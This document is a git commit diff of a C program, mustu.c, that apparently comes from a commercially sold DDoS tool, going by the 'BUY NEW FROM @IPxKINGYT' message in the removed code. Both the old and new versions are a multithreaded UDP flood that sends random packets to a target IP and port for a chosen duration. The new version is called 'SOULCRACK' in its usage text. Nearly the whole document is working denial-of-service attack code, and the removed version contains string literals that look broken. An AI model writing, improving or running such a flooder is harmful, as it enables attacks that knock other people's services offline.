397d7c8c63f6bd68b7d64868f3eb6bb82a924b24
jaanbhai1 <jaanbhai@duck.com>
2025-10-28 10:03:00 +0530

    Update mustu.c

--- mustu.c
+++ mustu.c
@@ -1,94 +1,126 @@
-#define _XOPEN_SOURCE 700
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <pthread.h>
 #include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 #include <time.h>
 
-#define PAYLOAD_SIZE 1024
-#define EXPIRY_DATE "2095-08-09"
+char *TARGET_IP;
+int TARGET_PORT;
+int DURATION_TIME;
+int PACKET_SIZE;
+int THREAD_COUNT;
 
-typedef struct {
-    char ip[16];
-    int port;
-    int duration;
-} AttackParams;
 
-int is_expired() {
-    struct tm expiry_tm = {0};
-    struct tm current_tm = {0};
-    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
-    time_t now = time(NULL);
-    localtime_r(&now, &current_tm);
-    return difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0;
+void usage();
+void *send_packets(void *arg);
+
+void usage() {
+    fprintf(stderr, "Usage: ./SOULCRACK [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n");
+    exit(EXIT_FAILURE);
 }
 
-void generate_payload(char* payload, int size) {
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
-    for (int i = 0; i < size - 1; i++)
-        payload[i] = charset[rand() % (sizeof(charset) - 1)];
-    payload[size - 1] = '';
-}
-
-void* send_payload(void* arg) {
-    AttackParams* params = (AttackParams*)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    char payload[PAYLOAD_SIZE];
-
-    generate_payload(payload, PAYLOAD_SIZE);
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) pthread_exit(NULL);
-
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->port);
-    server_addr.sin_addr.s_addr = inet_addr(params->ip);
-
+void *send_packets(void *arg) {
+    int sockfd;
+    struct sockaddr_in servaddr;
+    char *packet_data;
     time_t start_time = time(NULL);
-    while (time(NULL) - start_time < params->duration)
-        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
 
-    close(sock);
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
+    }
+
+    memset(&servaddr, 0, sizeof(servaddr));
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(TARGET_PORT);
+    
+
+    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
+
+    packet_data = (char *)malloc(PACKET_SIZE);
+    if (packet_data == NULL) {
+        
+        fprintf(stderr, "Memory allocation failed\n");
+        close(sockfd);
+        pthread_exit(NULL);
+    }
+
+
+    for (int i = 0; i < PACKET_SIZE; i++) {
+        packet_data[i] = (char)(rand() % 256);
+    }
+
+    while (time(NULL) - start_time < DURATION_TIME) {
+        if (sendto(sockfd, packet_data, PACKET_SIZE, 0, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
+            perror("Send failed");
+
+        }
+    }
+
+    free(packet_data);
+    close(sockfd);
+    
+    
     pthread_exit(NULL);
 }
 
-int main(int argc, char* argv[]) {
-    if (argc != 5) {
-        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>
-", argv[0]);
-        return 1;
+int main(int argc, char *argv[]) {
+
+    if (argc != 6) {
+        usage();
     }
 
-    if (is_expired()) {
-        printf("BUY NEW FROM @IPxKINGYT
-");
-        return 1;
+
+    TARGET_IP = argv[1];
+    TARGET_PORT = atoi(argv[2]);
+    DURATION_TIME = atoi(argv[3]);
+    PACKET_SIZE = atoi(argv[4]);
+    THREAD_COUNT = atoi(argv[5]);
+
+
+    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
+        fprintf(stderr, "Error: Invalid argument values\n");
+        usage();
     }
 
-    AttackParams params;
-    strcpy(params.ip, argv[1]);
-    params.port = atoi(argv[2]);
-    params.duration = atoi(argv[3]);
-    int thread_count = atoi(argv[4]);
-    if (thread_count <= 0 || thread_count > 1500) {
-        printf("Invalid thread count. Use 1–1500.
-");
-        return 1;
+
+    printf("Sending packets to %s:%d for %d seconds with %d threads, each packet size %d bytes\n",
+           TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT, PACKET_SIZE);
+
+    pthread_t *threads;
+    threads = (pthread_t *)malloc(THREAD_COUNT * sizeof(pthread_t));
+    if (threads == NULL) {
+
+        fprintf(stderr, "Memory allocation failed for thread IDs\n");
+        return EXIT_FAILURE;
     }
 
-    pthread_t threads[thread_count];
-    printf("Launching on %s:%d for %d seconds with %d threads...
-",
-           params.ip, params.port, params.duration, thread_count);
 
-    for (int i = 0; i < thread_count; i++)
-        pthread_create(&threads[i], NULL, send_payload, &params);
-    for (int i = 0; i < thread_count; i++)
-        pthread_join(threads[i], NULL);
+    srand(time(NULL));
 
-    printf("Attack finished on %s:%d.
-", params.ip, params.port);
+
+    int i;
+    for (i = 0; i < THREAD_COUNT; i++) {
+
+        if (pthread_create(&threads[i], NULL, send_packets, NULL) != 0) {
+            perror("Thread creation failed");
+
+            break;
+        }
+    }
+
+
+    for (int j = 0; j < i; j++) {
+        pthread_join(threads[j], NULL);
+    }
+
+
+    free(threads);
+    puts("Packet sending finished.");
+
     return 0;
 }
